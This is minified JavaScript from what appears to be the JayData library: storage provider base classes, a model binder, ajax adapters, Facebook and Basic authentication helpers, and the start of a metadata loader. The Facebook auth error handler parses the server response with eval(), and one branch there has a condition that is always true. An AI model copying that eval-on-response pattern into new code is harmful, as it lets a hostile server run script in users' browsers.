$data.ConcurrencyMode={Fixed:'fixed',None:'none'};$data.Class.define('$data.StorageProviderBase',null,null,{constructor:function(schemaConfiguration){this.providerConfiguration=schemaConfiguration||{};},providers:{},supportedDataTypes:{value:[],writable:false},initializeStore:function(callBack){Guard.raise("Pure class");},executeQuery:function(queryable,callBack){Guard.raise("Pure class");},buildIndependentBlocks:function(changedItems){var edgesTo=[];var edgesFrom=[];function hasOwnProperty(obj){for(var p in obj){if(obj.hasOwnProperty(p))
return true;}
return false;}
for(var i=0;i<changedItems.length;i++){var current=changedItems[i];if(!current.dependentOn||current.dependentOn.length==0){continue;}
var to=null;for(var j=0;j<current.dependentOn.length;j++){var currentDependency=current.dependentOn[j];if(currentDependency.entityState==$data.EntityState.Unchanged){continue;}
to=to||{};var ixDependendOn=-1;for(var k=0;k<changedItems.length;k++){if(changedItems[k].data==currentDependency){ixDependendOn=k;break;}}
if(ixDependendOn==-1){Guard.raise(new Exception('Dependent object not found','ObjectNotFound',current.dependentOn[j]));}
to[ixDependendOn]=true;from=edgesFrom[ixDependendOn]||{};from[i]=true;edgesFrom[ixDependendOn]=from;}
if(to!==null)
edgesTo[i]=to;}
var independentBlocks=[];var currentBlock=[];for(var x=0;x<changedItems.length;x++){if(!edgesTo.hasOwnProperty(x)){currentBlock.push(x);}}
while(currentBlock.length>0){var cbix=[].concat(currentBlock);currentBlock=[];for(var b=0;b<cbix.length;b++){var dependentNodes=edgesFrom[cbix[b]];if(typeof dependentNodes!=='undefined'){for(var d in dependentNodes){delete edgesTo[d][cbix[b]];if(!hasOwnProperty(edgesTo[d])){delete edgesTo[d];currentBlock.push(d);}}}
delete edgesFrom[cbix[b]];}
var cb=[];for(var c=0;c<cbix.length;c++){var item=changedItems[cbix[c]];if(item.data.entityState!=$data.EntityState.Unchanged)
cb.push(item);}
if(cb.length>0)
independentBlocks.push(cb);}
return independentBlocks;},getTraceString:function(queryable){Guard.raise("Pure class");},setContext:function(ctx){this.context=ctx;},_buildContinuationFunction:function(context,query){if(Array.isArray(query.result)){query.result.next=this._buildPagingMethod(context,query,'next');query.result.prev=this._buildPagingMethod(context,query,'prev');}},_buildPagingMethod:function(context,query,mode){return function(onResult_items){var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult_items);var continuation=new $data.Expressions.ContinuationExpressionBuilder(mode);var continuationResult=continuation.compile(query);if(continuationResult.expression){var queryable=Container.createQueryable(context,continuationResult.expression);queryable.defaultType=query.defaultType;context.executeQuery(queryable,cbWrapper);}else{cbWrapper.error(new Exception(continuationResult.message,'Invalid Operation',continuationResult));}
return pHandler.getPromise();}},buildDbType_modifyInstanceDefinition:function(instanceDefinition,storageModel){var buildDbType_copyPropertyDefinition=function(propertyDefinition,refProp){var cPropertyDef;if(refProp){cPropertyDef=JSON.parse(JSON.stringify(instanceDefinition[refProp]));cPropertyDef.kind=propertyDefinition.kind;cPropertyDef.name=propertyDefinition.name;cPropertyDef.notMapped=false;}else{cPropertyDef=JSON.parse(JSON.stringify(propertyDefinition));}
cPropertyDef.dataType=Container.resolveType(propertyDefinition.dataType);cPropertyDef.type=cPropertyDef.dataType;cPropertyDef.key=false;cPropertyDef.computed=false;return cPropertyDef;};var buildDbType_createConstrain=function(foreignType,dataType,propertyName,prefix){var constrain=new Object();constrain[foreignType.name]=propertyName;constrain[dataType.name]=prefix+'__'+propertyName;return constrain;};if(storageModel.Associations){storageModel.Associations.forEach(function(association){var addToEntityDef=false;var foreignType=association.FromType;var dataType=association.ToType;var foreignPropName=association.ToPropertyName;association.ReferentialConstraint=association.ReferentialConstraint||[];if((association.FromMultiplicity=="*"&&association.ToMultiplicity=="0..1")||(association.FromMultiplicity=="0..1"&&association.ToMultiplicity=="1")){foreignType=association.ToType;dataType=association.FromType;foreignPropName=association.FromPropertyName;addToEntityDef=true;}
foreignType.memberDefinitions.getPublicMappedProperties().filter(function(d){return d.key}).forEach(function(d){if(addToEntityDef){instanceDefinition[foreignPropName+'__'+d.name]=buildDbType_copyPropertyDefinition(d,foreignPropName);}
association.ReferentialConstraint.push(buildDbType_createConstrain(foreignType,dataType,d.name,foreignPropName));},this);},this);}
if(storageModel.ComplexTypes){storageModel.ComplexTypes.forEach(function(complexType){complexType.ReferentialConstraint=complexType.ReferentialConstraint||[];complexType.ToType.memberDefinitions.getPublicMappedProperties().forEach(function(d){instanceDefinition[complexType.FromPropertyName+'__'+d.name]=buildDbType_copyPropertyDefinition(d);complexType.ReferentialConstraint.push(buildDbType_createConstrain(complexType.ToType,complexType.FromType,d.name,complexType.FromPropertyName));},this);},this);}},buildDbType_generateConvertToFunction:function(storageModel){return function(logicalEntity){var dbInstance=new storageModel.PhysicalType();dbInstance.entityState=logicalEntity.entityState;storageModel.PhysicalType.memberDefinitions.getPublicMappedProperties().forEach(function(property){if(logicalEntity[property.name]!==undefined){dbInstance[property.name]=logicalEntity[property.name];}},this);if(storageModel.Associations){storageModel.Associations.forEach(function(association){if((association.FromMultiplicity=="*"&&association.ToMultiplicity=="0..1")||(association.FromMultiplicity=="0..1"&&association.ToMultiplicity=="1")){var complexInstance=logicalEntity[association.FromPropertyName];if(complexInstance!==undefined){association.ReferentialConstraint.forEach(function(constrain){if(complexInstance!==null){dbInstance[constrain[association.From]]=complexInstance[constrain[association.To]];}else{dbInstance[constrain[association.From]]=null;}},this);}}},this);}
if(storageModel.ComplexTypes){storageModel.ComplexTypes.forEach(function(cmpType){var complexInstance=logicalEntity[cmpType.FromPropertyName];if(complexInstance!==undefined){cmpType.ReferentialConstraint.forEach(function(constrain){if(complexInstance!==null){dbInstance[constrain[cmpType.From]]=complexInstance[constrain[cmpType.To]];}else{dbInstance[constrain[cmpType.From]]=null;}},this);}},this);}
return dbInstance;};},supportedFieldOperations:{value:{length:{dataType:"number",allowedIn:"filter, map"},substr:{dataType:"string",allowedIn:"filter",parameters:[{name:"startFrom",dataType:"number"},{name:"length",dataType:"number"}]},toLowerCase:{dataType:"string"}},enumerable:true,writable:true},resolveFieldOperation:function(operationName,expression,frameType){var result=this.supportedFieldOperations[operationName];if(Array.isArray(result)){var i=0;for(;i<result.length;i++){if(result[i].allowedType==='default'||Container.resolveType(result[i].allowedType)===Container.resolveType(expression.selector.memberDefinition.type)){result=result[i];break;}}
if(i===result.length){result=undefined;}}
if(!result){Guard.raise(new Exception("Field operation '"+operationName+"' is not supported by the provider"));};if(frameType&&result.allowedIn){if((result.allowedIn instanceof Array&&!result.allowedIn.some(function(type){return frameType===Container.resolveType(type);}))||(!(result.allowedIn instanceof Array)&&frameType!==Container.resolveType(result.allowedIn))){Guard.raise(new Exception(operationName+" not supported in: "+frameType.name));}}
result.name=operationName;return result;},supportedBinaryOperators:{value:{equal:{mapTo:'eq',dataType:"boolean"}},enumerable:true,writable:true},resolveBinaryOperator:function(operator,expression,frameType){var result=this.supportedBinaryOperators[operator];if(!result){Guard.raise(new Exception("Binary operator '"+operator+"' is not supported by the provider"));};if(frameType&&result.allowedIn){if((result.allowedIn instanceof Array&&!result.allowedIn.some(function(type){return frameType===Container.resolveType(type);}))||(!(result.allowedIn instanceof Array)&&frameType!==Container.resolveType(result.allowedIn))){Guard.raise(new Exception(operator+" not supported in: "+frameType.name));}}
result.name=operator;return result;},supportedUnaryOperators:{value:{not:{mapTo:'not'}},enumerable:true,writable:true},resolveUnaryOperator:function(operator,expression,frameType){var result=this.supportedUnaryOperators[operator];if(!result){Guard.raise(new Exception("Unary operator '"+operator+"' is not supported by the provider"));};if(frameType&&result.allowedIn){if((result.allowedIn instanceof Array&&!result.allowedIn.some(function(type){return frameType===Container.resolveType(type);}))||(!(result.allowedIn instanceof Array)&&frameType!==Container.resolveType(result.allowedIn))){Guard.raise(new Exception(operator+" not supported in: "+frameType.name));}}
result.name=operator;return result;},supportedSetOperations:{value:{toArray:{invokable:true,allowedIn:[]}},enumerable:true,writable:true},resolveSetOperations:function(operation,expression,frameType){var result=this.supportedSetOperations[operation];if(!result){Guard.raise(new Exception("Operation '"+operation+"' is not supported by the provider"));};var allowedIn=result.allowedIn||[];if(frameType&&allowedIn){if((allowedIn instanceof Array&&!allowedIn.some(function(type){return frameType===Container.resolveType(type);}))||(!(allowedIn instanceof Array)&&frameType!==Container.resolveType(allowedIn))){Guard.raise(new Exception(operation+" not supported in: "+frameType.name));}}
return result;},resolveTypeOperations:function(operation,expression,frameType){Guard.raise(new Exception("Entity '"+expression.entityType.name+"' Operation '"+operation+"' is not supported by the provider"));},resolveContextOperations:function(operation,expression,frameType){Guard.raise(new Exception("Context '"+expression.instance.getType().name+"' Operation '"+operation+"' is not supported by the provider"));},makePhysicalTypeDefinition:function(entityDefinition,association){},_beginTran:function(tables,isWrite,callBack){callBack.success(new $data.Transaction());}},{onRegisterProvider:{value:new $data.Event()},registerProvider:function(name,provider){this.onRegisterProvider.fire({name:name,provider:provider},this);$data.RegisteredStorageProviders=$data.RegisteredStorageProviders||[];$data.RegisteredStorageProviders[name]=provider;},getProvider:function(name){var provider=$data.RegisteredStorageProviders[name];if(!provider)
console.warn("Provider not found: '"+name+"'");return provider;},isSupported:{get:function(){return true;},set:function(){}}});(function(){var localProviders=['webSql','indexedDb','LocalStore'];for(var i=0;i<localProviders.length;i++){var providerName=localProviders[i];if($data.StorageProviderLoader.isSupported(providerName)){var moduleName=$data.StorageProviderLoader.npmModules[providerName];$data.StorageProviderLoader.npmModules['local']=moduleName;var mappedName=$data.StorageProviderLoader.ProviderNames[providerName];$data.StorageProviderLoader.ProviderNames['local']=mappedName;$data.RegisteredStorageProviders=$data.RegisteredStorageProviders||[];var provider=$data.RegisteredStorageProviders[providerName];if(!provider){$data.StorageProviderBase.onRegisterProvider.attach(function(sender,providerData){if(providerData.name===providerName){$data.StorageProviderBase.registerProvider("local",providerData.provider);}});}else{$data.StorageProviderBase.registerProvider("local",provider);}
break;}}})();$data.Class.define('$data.ServiceOperation',null,null,{},{translateDefinition:function(propertyDef,name,definedBy){propertyDef.serviceName=name;var memDef=new $data.MemberDefinition(this.generateServiceOperation(propertyDef),this);memDef.name=name;return memDef;},generateServiceOperation:function(cfg){var fn;if(cfg.serviceMethod){var returnType=cfg.returnType?Container.resolveType(cfg.returnType):{};if(returnType.isAssignableTo&&returnType.isAssignableTo($data.Queryable)){fn=cfg.serviceMethod;}else{fn=function(){var lastParam=arguments[arguments.length-1];var pHandler=new $data.PromiseHandler();var cbWrapper;var args=arguments;if(typeof lastParam==='function'){cbWrapper=pHandler.createCallback(lastParam);arguments[arguments.length-1]=cbWrapper;}else{cbWrapper=pHandler.createCallback();arguments.push(cbWrapper);}
try{var result=cfg.serviceMethod.apply(this,arguments);if(result!==undefined)
cbWrapper.success(result);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();}}}else{fn=function(){var context=this;var memberdef;var bindedEntity;if(this instanceof $data.Entity||this instanceof $data.EntitySet){var entitySet;if(this instanceof $data.Entity){if(this.context){context=this.context;entitySet=context.getEntitySetFromElementType(this.getType());if(!cfg.method&&cfg.IsSideEffecting!==false){cfg.method='POST';}}else{Guard.raise('entity not attached into the context');return;}}else if(this instanceof $data.EntitySet){context=this.entityContext;entitySet=this;var esDef=context.getType().getMemberDefinition(entitySet.name);memberdef=$data.MemberDefinition.translateDefinition(esDef.actions[cfg.serviceName],cfg.serviceName,entitySet.getType());}
bindedEntity={data:this,entitySet:entitySet};}
var virtualEntitySet=cfg.elementType?context.getEntitySetFromElementType(Container.resolveType(cfg.elementType)):null;var paramConstExpression=null;if(cfg.params){paramConstExpression=[];if(arguments[0]&&typeof arguments[0]==='object'&&cfg.params&&cfg.params[0]&&((Container.resolveType(cfg.params[0].type)!==$data.Object||cfg.params[0].name in arguments[0]))){var argObj=arguments[0];for(var i=0;i<cfg.params.length;i++){var paramConfig=cfg.params[i];if(paramConfig.name&&paramConfig.type&&paramConfig.name in argObj){paramConstExpression.push(Container.createConstantExpression(argObj[paramConfig.name],Container.resolveType(paramConfig.type),paramConfig.name));}}}
else{for(var i=0;i<cfg.params.length;i++){if(typeof arguments[i]=='function')break;var paramConfig=cfg.params[i];if(paramConfig.name&&paramConfig.type&&arguments[i]!==undefined){paramConstExpression.push(Container.createConstantExpression(arguments[i],Container.resolveType(paramConfig.type),paramConfig.name));}}}}
var ec=Container.createEntityContextExpression(context);if(!memberdef){if(bindedEntity&&bindedEntity.data){memberdef=bindedEntity.data.getType().getMemberDefinition(cfg.serviceName);}else{memberdef=context.getType().getMemberDefinition(cfg.serviceName);}}
var es=Container.createServiceOperationExpression(ec,Container.createMemberInfoExpression(memberdef),paramConstExpression,cfg,bindedEntity);var clb=arguments[arguments.length-1];if(typeof clb!=='function'){clb=undefined;}
if(virtualEntitySet){var q=Container.createQueryable(virtualEntitySet,es);if(clb){es.isTerminated=true;return q._runQuery(clb);}
return q;}
else{var returnType=cfg.returnType?Container.resolveType(cfg.returnType):null;var q=Container.createQueryable(context,es);q.defaultType=returnType||$data.Object;if(returnType===$data.Queryable){q.defaultType=Container.resolveType(cfg.elementType);if(clb){es.isTerminated=true;return q._runQuery(clb);}
return q;}
es.isTerminated=true;return q._runQuery(clb);}};};var params=cfg.params||[];$data.typeSystem.extend(fn,cfg,{params:params});return fn;}});$data.Class.define('$data.ServiceAction',$data.ServiceOperation,null,{},{});$data.Base.extend('$data.EntityWrapper',{getEntity:function(){Guard.raise("pure object");}});if(typeof jQuery!=='undefined'&&jQuery.ajax){$data.ajax=$data.ajax||jQuery.ajax;}
if(typeof WinJS!=='undefined'&&WinJS.xhr){$data.ajax=$data.ajax||function(options){$data.typeSystem.extend(options,{dataType:'json',headers:{}});var dataTypes={'json':{accept:'application/json, text/javascript',convert:JSON.parse},'text':{accept:'text/plain',convert:function(e){return e;}},'html':{accept:'text/html',convert:function(e){return e;}},'xml':{accept:'application/xml, text/xml',convert:function(e){return e;}}}
var dataTypeContext=dataTypes[options.dataType.toLowerCase()];options.headers.Accept=dataTypeContext.accept;var successClb=options.success||$data.defaultSuccessCallback;var errorClb=options.error||$data.defaultErrorCallback;var progressClb=options.progress;var success=function(r){var result=dataTypeContext.convert(r.responseText);successClb(result);}
var error=function(r){var error=dataTypeContext.convert(r.responseText);errorClb(error);}
var progress=progressClb;WinJS.xhr(options).done(success,error,progress);}}
if(typeof Ext!=='undefined'&&typeof Ext.Ajax){$data.ajax=$data.ajax||function(options){Ext.Ajax.request(options);};}
$data.ajax=$data.ajax||function(){var cfg=arguments[arguments.length-1];var clb=$data.typeSystem.createCallbackSetting(cfg);clb.error("Not implemented");};$C('$data.modelBinder.FindProjectionVisitor',$data.Expressions.EntityExpressionVisitor,null,{VisitProjectionExpression:function(expression){this.projectionExpression=expression;}});$C('$data.modelBinder.ModelBinderConfigCompiler',$data.Expressions.EntityExpressionVisitor,null,{constructor:function(query,includes,oDataProvider){this._query=query;this._includes=includes;this._isoDataProvider=oDataProvider||false;},VisitSingleExpression:function(expression){this._defaultModelBinder(expression);},VisitSomeExpression:function(expression){this._defaultModelBinder(expression);},VisitEveryExpression:function(expression){this._defaultModelBinder(expression);},VisitToArrayExpression:function(expression){this._defaultModelBinder(expression);},VisitFirstExpression:function(expression){this._defaultModelBinder(expression);},VisitForEachExpression:function(expression){this._defaultModelBinder(expression);},VisitServiceOperationExpression:function(expression){if(expression.cfg.returnType){var returnType=Container.resolveType(expression.cfg.returnType);if((typeof returnType.isAssignableTo==='function'&&returnType.isAssignableTo($data.Queryable))||returnType===$data.Array){this._defaultModelBinder(expression);}else{var builder=Container.createqueryBuilder();builder.modelBinderConfig['$type']=returnType;if(typeof returnType.isAssignableTo==='function'&&returnType.isAssignableTo($data.Entity)){builder.modelBinderConfig['$selector']=['json:'+expression.cfg.serviceName];}else{builder.modelBinderConfig['$source']=expression.cfg.serviceName;}
this.VisitExpression(expression,builder);builder.resetModelBinderProperty();this._query.modelBinderConfig=builder.modelBinderConfig;}}},VisitCountExpression:function(expression){var builder=Container.createqueryBuilder();builder.modelBinderConfig['$type']=$data.Array;builder.selectModelBinderProperty('$item');builder.modelBinderConfig['$type']=$data.Integer;builder.modelBinderConfig['$source']='cnt';builder.resetModelBinderProperty();this._query.modelBinderConfig=builder.modelBinderConfig;},VisitBatchDeleteExpression:function(expression){var builder=Container.createqueryBuilder();builder.modelBinderConfig['$type']=$data.Array;builder.selectModelBinderProperty('$item');builder.modelBinderConfig['$type']=$data.Integer;builder.modelBinderConfig['$source']='cnt';builder.resetModelBinderProperty();this._query.modelBinderConfig=builder.modelBinderConfig;},VisitConstantExpression:function(expression,builder){builder.modelBinderConfig['$type']=expression.type;builder.modelBinderConfig['$value']=expression.value;},VisitExpression:function(expression,builder){var projVisitor=Container.createFindProjectionVisitor();projVisitor.Visit(expression);if(projVisitor.projectionExpression){this.Visit(projVisitor.projectionExpression,builder);}else{this.DefaultSelection(builder,this._query.defaultType,this._includes);}},_defaultModelBinder:function(expression){var builder=Container.createqueryBuilder();builder.modelBinderConfig['$type']=$data.Array;if(this._isoDataProvider){builder.modelBinderConfig['$selector']=['json:d.results','json:d','json:results'];}
builder.modelBinderConfig['$item']={};builder.selectModelBinderProperty('$item');this.VisitExpression(expression,builder);builder.resetModelBinderProperty();this._query.modelBinderConfig=builder.modelBinderConfig;},_addPropertyToModelBinderConfig:function(elementType,builder){var storageModel=this._query.context._storageModel.getStorageModel(elementType);if(elementType.memberDefinitions){elementType.memberDefinitions.getPublicMappedProperties().forEach(function(prop){if((!storageModel)||(storageModel&&!storageModel.Associations[prop.name]&&!storageModel.ComplexTypes[prop.name])){if(!storageModel&&this._query.context.storageProvider.supportedDataTypes.indexOf(Container.resolveType(prop.dataType))<0){builder.selectModelBinderProperty(prop.name);var type=Container.resolveType(prop.dataType);builder.modelBinderConfig['$type']=type;if(this._isoDataProvider){builder.modelBinderConfig['$selector']=['json:'+prop.name+'.results','json:'+prop.name];}else{builder.modelBinderConfig['$selector']='json:'+prop.name;}
if(type===$data.Array&&prop.elementType){builder.selectModelBinderProperty('$item');var arrayElementType=Container.resolveType(prop.elementType);builder.modelBinderConfig['$type']=arrayElementType;this._addPropertyToModelBinderConfig(arrayElementType,builder);builder.popModelBinderProperty();}else{this._addPropertyToModelBinderConfig(type,builder);}
builder.popModelBinderProperty();}else{if(prop.key){builder.addKeyField(prop.name);}
if(prop.concurrencyMode===$data.ConcurrencyMode.Fixed){builder.modelBinderConfig[prop.name]={$selector:'json:__metadata',$source:'etag'}}else{builder.modelBinderConfig[prop.name]=prop.name;}}}},this);}else{builder._binderConfig.$item=builder._binderConfig.$item||{};builder.modelBinderConfig=builder._binderConfig.$item;}
if(storageModel){this._addComplexTypeProperties(storageModel.ComplexTypes,builder);}},_addComplexTypeProperties:function(complexTypes,builder){complexTypes.forEach(function(ct){if(ct.ToType!==$data.Array){builder.selectModelBinderProperty(ct.FromPropertyName);builder.modelBinderConfig['$type']=ct.ToType;if(this._isoDataProvider){builder.modelBinderConfig['$selector']=['json:'+ct.FromPropertyName+'.results','json:'+ct.FromPropertyName];}else{builder.modelBinderConfig['$selector']='json:'+ct.FromPropertyName;}
this._addPropertyToModelBinderConfig(ct.ToType,builder);builder.popModelBinderProperty();}else{var dt=ct.ToType;var et=Container.resolveType(ct.FromType.memberDefinitions.getMember(ct.FromPropertyName).elementType);if(dt===$data.Array&&et&&et.isAssignableTo&&et.isAssignableTo($data.Entity)){config={$type:$data.Array,$selector:'json:'+ct.FromPropertyName,$item:{$type:et}};var md=et.memberDefinitions.getPublicMappedProperties();for(var i=0;i<md.length;i++){config.$item[md[i].name]={$type:md[i].type,$source:md[i].name};}
builder.modelBinderConfig[ct.FromPropertyName]=config;}else{builder.modelBinderConfig[ct.FromPropertyName]={$type:ct.ToType,$source:ct.FromPropertyName};}}},this);},DefaultSelection:function(builder,type,allIncludes){builder.modelBinderConfig['$type']=type;var storageModel=this._query.context._storageModel.getStorageModel(type);this._addPropertyToModelBinderConfig(type,builder);if(allIncludes){allIncludes.forEach(function(include){var includes=include.name.split('.');var association=null;var tmpStorageModel=storageModel;var itemCount=0;for(var i=0;i<includes.length;i++){if(builder.modelBinderConfig.$item){builder.selectModelBinderProperty('$item');itemCount++;}
builder.selectModelBinderProperty(includes[i]);association=tmpStorageModel.Associations[includes[i]];tmpStorageModel=this._query.context._storageModel.getStorageModel(association.ToType);}
if(this._isoDataProvider){builder.modelBinderConfig['$selector']=['json:'+includes[includes.length-1]+'.results','json:'+includes[includes.length-1]];}else{builder.modelBinderConfig['$selector']='json:'+includes[includes.length-1];}
if(association.ToMultiplicity==='*'){builder.modelBinderConfig['$type']=$data.Array;builder.selectModelBinderProperty('$item');builder.modelBinderConfig['$type']=include.type;this._addPropertyToModelBinderConfig(include.type,builder);builder.popModelBinderProperty();}else{builder.modelBinderConfig['$type']=include.type;this._addPropertyToModelBinderConfig(include.type,builder);}
for(var i=0;i<includes.length+itemCount;i++){builder.popModelBinderProperty();}},this);}},VisitProjectionExpression:function(expression,builder){this.hasProjection=true;this.Visit(expression.selector,builder);if(expression.selector&&expression.selector.expression instanceof $data.Expressions.ObjectLiteralExpression){builder.modelBinderConfig['$type']=expression.projectionAs||builder.modelBinderConfig['$type']||$data.Object;}},VisitParametricQueryExpression:function(expression,builder){if(expression.expression instanceof $data.Expressions.EntityExpression||expression.expression instanceof $data.Expressions.EntitySetExpression){this.VisitEntityAsProjection(expression,builder);}else{this.Visit(expression.expression,builder);}},VisitEntityAsProjection:function(expression,builder){this.mapping='';this.Visit(expression.expression,builder);var includes;if(this.mapping&&this._includes instanceof Array){includes=this._includes.filter(function(inc){return inc.name.indexOf(this.mapping+'.')===0},this);includes=includes.map(function(inc){return{name:inc.name.replace(this.mapping+'.',''),type:inc.type};},this);if(includes.length>0)
console.warn('WARN: include for mapped properties is not supported!');}
if(expression.expression instanceof $data.Expressions.EntityExpression){this.DefaultSelection(builder,expression.expression.entityType)}else if(expression.expression instanceof $data.Expressions.EntitySetExpression){builder.modelBinderConfig.$type=$data.Array;builder.modelBinderConfig.$item={};builder.selectModelBinderProperty('$item');this.DefaultSelection(builder,expression.expression.elementType)
builder.popModelBinderProperty();}},VisitEntityFieldExpression:function(expression,builder){this.Visit(expression.source,builder);this.Visit(expression.selector,builder);},VisitMemberInfoExpression:function(expression,builder){builder.modelBinderConfig['$type']=expression.memberDefinition.type;if(expression.memberDefinition.storageModel&&expression.memberName in expression.memberDefinition.storageModel.ComplexTypes){this._addPropertyToModelBinderConfig(Container.resolveType(expression.memberDefinition.type),builder);}else{if(!(builder.modelBinderConfig.$type&&Container.resolveType(builder.modelBinderConfig.$type).isAssignableTo&&Container.resolveType(builder.modelBinderConfig.$type).isAssignableTo($data.Entity)))
builder.modelBinderConfig['$source']=expression.memberName;}},VisitEntitySetExpression:function(expression,builder){if(expression.source instanceof $data.Expressions.EntityExpression){this.Visit(expression.source,builder);this.Visit(expression.selector,builder);}},VisitComplexTypeExpression:function(expression,builder){this.Visit(expression.source,builder);this.Visit(expression.selector,builder);if(('$selector'in builder.modelBinderConfig)&&(builder.modelBinderConfig.$selector.length>0)){if(builder.modelBinderConfig.$selector instanceof $data.Array){var temp=builder.modelBinderConfig.$selector[1];builder.modelBinderConfig.$selector[0]=temp+'.'+expression.selector.memberName+'.results';builder.modelBinderConfig.$selector[1]=temp+'.'+expression.selector.memberName;}else{builder.modelBinderConfig.$selector+='.'+expression.selector.memberName;}}else{if(this._isoDataProvider){builder.modelBinderConfig['$selector']=['json:'+expression.selector.memberName+'.results','json:'+expression.selector.memberName];}else{builder.modelBinderConfig['$selector']='json:'+expression.selector.memberName;}}},VisitEntityExpression:function(expression,builder){this.Visit(expression.source,builder);},VisitAssociationInfoExpression:function(expression,builder){if(('$selector'in builder.modelBinderConfig)&&(builder.modelBinderConfig.$selector.length>0)){if(builder.modelBinderConfig.$selector instanceof $data.Array){var temp=builder.modelBinderConfig.$selector[1];builder.modelBinderConfig.$selector[0]=temp+'.'+expression.associationInfo.FromPropertyName+'.results';builder.modelBinderConfig.$selector[1]=temp+'.'+expression.associationInfo.FromPropertyName;}else{builder.modelBinderConfig.$selector+='.'+expression.associationInfo.FromPropertyName;}}else{if(this._isoDataProvider){builder.modelBinderConfig['$selector']=['json:'+expression.associationInfo.FromPropertyName+'.results','json:'+expression.associationInfo.FromPropertyName];}else{builder.modelBinderConfig['$selector']='json:'+expression.associationInfo.FromPropertyName;}}
if(this.mapping&&this.mapping.length>0){this.mapping+='.';}
this.mapping+=expression.associationInfo.FromPropertyName;},VisitObjectLiteralExpression:function(expression,builder){builder.modelBinderConfig['$type']=$data.Object;expression.members.forEach(function(of){this.Visit(of,builder);},this);},VisitObjectFieldExpression:function(expression,builder){builder.selectModelBinderProperty(expression.fieldName);if(expression.expression instanceof $data.Expressions.EntityExpression||expression.expression instanceof $data.Expressions.EntitySetExpression){this.VisitEntityAsProjection(expression,builder);}else{this.Visit(expression.expression,builder);}
builder.popModelBinderProperty();}});$data.Class.define("$data.Authentication.AuthenticationBase",null,null,{constructor:function(cfg){this.configuration=cfg||{};this.Authenticated=false;},Login:function(callbacks){Guard.raise("Pure class");},Logout:function(){Guard.raise("Pure class");},CreateRequest:function(cfg){Guard.raise("Pure class");}},null);$data.Class.define("$data.Authentication.Anonymous",$data.Authentication.AuthenticationBase,null,{constructor:function(cfg){this.configuration=cfg||{};this.Authenticated=false;},Login:function(callbacks){},Logout:function(){},CreateRequest:function(cfg){$data.ajax(cfg);}},null);$data.Class.define("$data.Authentication.FacebookAuth",$data.Authentication.AuthenticationBase,null,{constructor:function(cfg){this.configuration=$data.typeSystem.extend({Url_code:'',type_code:'',scope:'',Url_token:'',type_token:'',access_token:'',app_id:''},cfg);},Login:function(callbacks){if(this.Authenticated){return;}
var provider=this;provider.configuration.stateCallbacks=callbacks||{};$data.ajax({url:this.configuration.Url_code,data:'type='+provider.configuration.type_code+'&client_id='+provider.configuration.app_id+'&scope='+provider.configuration.scope,type:'POST',dataType:'json',success:function(data){if(typeof provider.configuration.stateCallbacks.pending=="function")
provider.configuration.stateCallbacks.pending(data);provider._processRequestToken(data);provider.Authenticated=true;},error:function(){if(typeof provider.configuration.stateCallbacks.error=="function")
provider.configuration.stateCallbacks.error(arguments);}});},Logout:function(){this.Authenticated=false;},CreateRequest:function(cfg){if(!cfg)
return;var _this=this;if(cfg.url.indexOf('access_token=')===-1){if(cfg.url&&this.Authenticated){var andChar='?';if(cfg.url.indexOf(andChar)>0)
andChar='&';if(this.configuration.access_token)
cfg.url=cfg.url+andChar+'access_token='+this.configuration.access_token;}}
$data.ajax(cfg);},_processRequestToken:function(verification_data){var provider=this;$data.ajax({url:provider.configuration.Url_token,data:'type='+provider.configuration.type_token+'&client_id='+provider.configuration.app_id+'&code='+verification_data.code,type:'POST',dataType:'json',success:function(result){provider.configuration.access_token=result.access_token;if(typeof provider.configuration.stateCallbacks.success=="function")
provider.configuration.stateCallbacks.success(result);},error:function(obj){var data=eval('('+obj.responseText+')');if(data.error){if(data.error.message=="authorization_pending"){setTimeout(function(){provider._processRequestToken(verification_data);},2000);}else if("authorization_declined"){if(typeof provider.configuration.stateCallbacks.abort=="function")
provider.configuration.stateCallbacks.abort(arguments);}}}});}},null);$data.Class.define("$data.Authentication.BasicAuth.BasicAuth",$data.Authentication.AuthenticationBase,null,{constructor:function(cfg){this.configuration=$data.typeSystem.extend({Username:'',Password:''},cfg);},Login:function(callbacks){if(callbacks&&typeof callbacks.pending=="function")
callbacks.pending();},Logout:function(){},CreateRequest:function(cfg){if(!cfg)
return;var _this=this;var origBeforeSend=cfg.beforeSend;cfg.beforeSend=function(xhr){xhr.setRequestHeader("Authorization","Basic  "+_this.__encodeBase64(_this.configuration.Username+":"+_this.configuration.Password));if(typeof origBeforeSend=="function")
origBeforeSend(xhr);};$data.ajax(cfg);},__encodeBase64:function(val){var b64array="ABCDEFGHIJKLMNOP"+"QRSTUVWXYZabcdef"+"ghijklmnopqrstuv"+"wxyz0123456789+/"+"=";input=val;var base64="";var hex="";var chr1,chr2,chr3="";var enc1,enc2,enc3,enc4="";var i=0;do{chr1=input.charCodeAt(i++);chr2=input.charCodeAt(i++);chr3=input.charCodeAt(i++);enc1=chr1>>2;enc2=((chr1&3)<<4)|(chr2>>4);enc3=((chr2&15)<<2)|(chr3>>6);enc4=chr3&63;if(isNaN(chr2)){enc3=enc4=64;}else if(isNaN(chr3)){enc4=64;}
base64=base64+
b64array.charAt(enc1)+
b64array.charAt(enc2)+
b64array.charAt(enc3)+
b64array.charAt(enc4);chr1=chr2=chr3="";enc1=enc2=enc3=enc4="";}while(i<input.length);return base64;}},null);$data.Class.define('$data.MetadataLoaderClass',null,null,{load:function(metadataUri,callBack,config){var cnf={EntityBaseClass:'$data.Entity',ContextBaseClass:'$data.EntityContext',AutoCreateContext:false,DefaultNamespace:('ns'+Math.random()).replace('.','')+metadataUri.replace(/[^\w]/g,"_"),ContextInstanceName:'context',EntitySetBaseClass:'$data.EntitySet',CollectionBaseClass:'Array',url:metadataUri,user:undefined,password:undefined,withCredentials:undefined,httpHeaders:undefined};$data.typeSystem.extend(cnf,config||{});if(cnf.DefaultNamespace&&cnf.DefaultNamespace.lastIndexOf('.')!==(cnf.DefaultNamespace.length-1))
cnf.DefaultNamespace+='.';this.factoryCache=this.factoryCache||{};callBack=$data.typeSystem.createCallbackSetting(callBack);if(metadataUri in this.factoryCache){callBack.success.apply({},this.factoryCache[metadataUri]);return;}
var metadataUri;if(cnf.url){cnf.SerivceUri=cnf.url.replace('/$metadata','');if(cnf.url.indexOf('/$metadata')===-1){cnf.metadataUri=cnf.url.replace(/\/+$/,'')+'/$metadata';}else{cnf.metadataUri=cnf.url;}}else{callBack.error('metadata url is missing');}
